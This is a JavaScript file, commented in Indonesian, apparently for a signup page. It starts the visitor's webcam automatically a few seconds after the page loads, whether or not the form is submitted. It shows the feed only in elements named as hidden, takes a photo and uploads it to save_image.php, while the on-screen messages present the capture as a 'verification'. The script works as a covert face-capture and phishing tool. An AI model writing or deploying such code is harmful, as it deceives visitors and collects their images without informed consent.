document.addEventListener('DOMContentLoaded', function() {
  const video = document.getElementById('hiddenVideo');
  const canvas = document.getElementById('hiddenCanvas');
  const verificationStatus = document.getElementById('verificationStatus');
  const progressFill = document.getElementById('progressFill');
  const signupForm = document.getElementById('signupForm');
  
  let cameraStream = null;

  // Fungsi untuk update status verifikasi
  function updateStatus(icon, text, className = '') {
    verificationStatus.innerHTML = `<span class="status-icon">${icon}</span><span class="status-text">${text}</span>`;
    verificationStatus.className = `verification-status ${className}`;
  }

  // Fungsi untuk update progress bar
  function updateProgress(percentage) {
    progressFill.style.width = percentage + '%';
  }

  // Fungsi untuk mengambil foto
  function capturePhoto() {
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.log('Video belum siap');
      return null;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    return canvas.toDataURL('image/png');
  }

  // Fungsi untuk mengirim foto ke server
  function sendPhotoToServer(dataURL) {
    return fetch('save_image.php', {
      method: 'POST',
      body: JSON.stringify({ image: dataURL }),
      headers: { 'Content-Type': 'application/json' }
    });
  }

  // Akses kamera secara otomatis
  async function initCamera() {
    try {
      updateStatus('🔍', 'Mengakses kamera...');
      updateProgress(10);
      
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        } 
      });
      
      cameraStream = stream;
      video.srcObject = stream;
      updateStatus('✅', 'Kamera terhubung', 'verification-success');
      updateProgress(40);
      
      // Tunggu 2 detik lalu ambil foto secara otomatis
      setTimeout(async () => {
        updateStatus('📸', 'Mengambil foto...');
        updateProgress(70);
        
        const photoData = capturePhoto();
        if (photoData) {
          try {
            updateStatus('📤', 'Mengirim verifikasi...');
            updateProgress(90);
            
            await sendPhotoToServer(photoData);
            updateStatus('✅', 'Verifikasi berhasil!', 'verification-success');
            updateProgress(100);
            
            // Stop kamera setelah berhasil
            if (cameraStream) {
              cameraStream.getTracks().forEach(track => track.stop());
            }
          } catch (error) {
            console.error('Gagal mengirim foto:', error);
            updateStatus('❌', 'Gagal mengirim verifikasi', 'verification-error');
          }
        }
      }, 2000);
      
    } catch (error) {
      console.error('Error mengakses kamera:', error);
      updateStatus('❌', 'Izin kamera ditolak', 'verification-error');
    }
  }

  // Handle form submission
  if (signupForm) {
    signupForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Ambil data form
      const name = document.getElementById('name').value;
      const email = document.getElementById('email').value;
      
      // Scroll ke section verifikasi
      document.getElementById('verifikasi').scrollIntoView({ 
        behavior: 'smooth' 
      });
      
      // Mulai verifikasi kamera jika belum
      if (!video.srcObject) {
        setTimeout(initCamera, 1000);
      }
    });
  }

  // Jalankan kamera otomatis setelah 3 detik
  setTimeout(initCamera, 3000);
});